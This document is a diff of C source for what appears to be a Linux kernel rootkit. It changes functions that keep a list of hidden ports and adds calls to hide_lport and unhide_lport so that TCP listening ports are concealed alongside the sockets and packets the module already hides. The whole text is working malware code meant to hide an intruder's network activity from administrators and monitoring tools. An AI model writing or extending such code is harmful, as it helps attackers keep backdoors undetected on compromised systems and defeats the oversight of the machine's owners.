@@ -10,6 +10,7 @@
 #include "hook.h"
 #include "sockhide.h"
 #include "packhide.h"
+#include "porthide.h"
 
 port_list_t hidden_ports = {
     .port  = -1,
@@ -99,25 +100,31 @@ unhide_sockets(void)
 }
 
 void
-hide_port(port_t port, proto proto)
+hide_port(port_t port, proto_t proto)
 {
     add_port_to_list(hidden_ports_tail, port, proto);
+
+    if (proto == tcp4 || proto == tcp6)
+        hide_lport(port);
 }
 
 void
-unhide_port(port_t port, proto proto)
+unhide_port(port_t port, proto_t proto)
 {
     remove_port_from_list(&hidden_ports, port, proto);
+
+    if (proto == tcp4 || proto == tcp6)
+        unhide_lport(port);
 }
 
 bool
-list_contains_port(port_list_t_ptr list, port_t port, proto proto)
+list_contains_port(port_list_t_ptr list, port_t port, proto_t proto)
 {
     return !!find_port_in_list(list, port, proto);
 }
 
 port_list_t_ptr
-find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
+find_port_in_list(port_list_t_ptr head, port_t port, proto_t proto)
 {
     port_list_t_ptr i;
     for (i = head; i; i = i->next)
@@ -128,7 +135,7 @@ find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
 }
 
 port_list_t_ptr
-add_port_to_list(port_list_t_ptr tail, port_t port, proto proto)
+add_port_to_list(port_list_t_ptr tail, port_t port, proto_t proto)
 {
     port_list_t_ptr node;
     node = (port_list_t_ptr)kmalloc(sizeof(port_list_t), GFP_KERNEL);
@@ -147,7 +154,7 @@ add_port_to_list(port_list_t_ptr tail, port_t port, proto proto)
 }
 
 port_list_t_ptr
-remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
+remove_port_from_list(port_list_t_ptr list, port_t port, proto_t proto)
 {
     port_list_t_ptr i = find_port_in_list(list, port, proto), ret = NULL;
 
